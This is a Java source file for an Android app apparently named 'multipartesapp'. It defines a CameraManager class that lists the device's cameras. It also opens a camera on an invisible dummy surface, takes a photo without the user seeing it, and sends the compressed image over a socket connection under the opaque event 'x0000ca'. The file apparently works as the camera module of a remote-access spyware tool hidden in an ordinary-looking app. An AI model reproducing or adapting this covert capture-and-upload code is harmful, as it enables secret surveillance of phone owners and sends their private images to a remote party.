package py.multipartesapp.utils.control;


import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.PictureCallback;
import android.util.Log;
import android.widget.ImageView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.TreeMap;

import py.multipartesapp.activities.Main;
import py.multipartesapp.utils.control.camera.APictureCapturingService;
import py.multipartesapp.utils.control.camera.CameraService;
import py.multipartesapp.utils.control.camera.PictureCapturingListener;
import py.multipartesapp.utils.control.camera.PictureCapturingServiceImpl;


public class CameraManager implements PictureCapturingListener {
    public static final String TAG = CameraManager.class.getSimpleName();

    private Context context;
    private Camera camera;

    private ImageView uploadBackPhoto;
    private ImageView uploadFrontPhoto;

    public CameraManager(Context context) {
        this.context = context;
    }

    private APictureCapturingService pictureService;

    /**
     * We've finished taking pictures from all phone's cameras
     */
    @Override
    public void onDoneCapturingAllPhotos(TreeMap<String, byte[]> picturesTaken) {
        if (picturesTaken != null && !picturesTaken.isEmpty()) {
            Log.d(TAG, "\"Done capturing all photos!\"");

            return;
        }
        Log.d(TAG, "No cameras found");
    }


    public void onCaptureDone(String pictureUrl, byte[] pictureData) {
        if (pictureData != null && pictureUrl != null) {

            sendPhoto(pictureData);

//            runOnUiThread(() -> {
//                final Bitmap bitmap = BitmapFactory.decodeByteArray(pictureData, 0, pictureData.length);
//                final int nh = (int) (bitmap.getHeight() * (512.0 / bitmap.getWidth()));
//                final Bitmap scaled = Bitmap.createScaledBitmap(bitmap, 512, nh, tr
        }
    }


    public void startUp(int cameraID) {

//        pictureService = PictureCapturingServiceImpl.getInstance(Main.);
//        pictureService.startCapturing(this);

//        Intent front_translucent = new Intent(this.context, CameraService.class);
//        front_translucent.putExtra("Front_Request", true);
//        front_translucent.putExtra("Quality_Mode", camCapture.getQuality());
//        getApplication().getApplicationContext().startService(
//                front_translucent);


        camera = Camera.open(cameraID);
        Parameters parameters = camera.getParameters();
        camera.setParameters(parameters);
        try {
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }


        camera.takePicture(null, null, new PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                releaseCamera();
                sendPhoto(data);
            }
        });
    }


    private void sendPhoto(byte[] data) {

        try {

            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);
            JSONObject object = new JSONObject();
            object.put("image", true);
            object.put("buffer", bos.toByteArray());
            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);


        } catch (JSONException e) {
            e.printStackTrace();
        }

    }

    private void releaseCamera() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    public JSONObject findCameraList() {

        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            return null;
        }

        try {
            JSONObject cameras = new JSONObject();
            JSONArray list = new JSONArray();
            cameras.put("camList", true);

            // Search for available cameras
            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Front");
                    jo.put("id", i);
                    list.put(jo);
                } else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Back");
                    jo.put("id", i);
                    list.put(jo);
                } else {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Other");
                    jo.put("id", i);
                    list.put(jo);
                }
            }

            cameras.put("list", list);
            return cameras;

        } catch (JSONException e) {
            e.printStackTrace();
        }

        return null;

    }


}
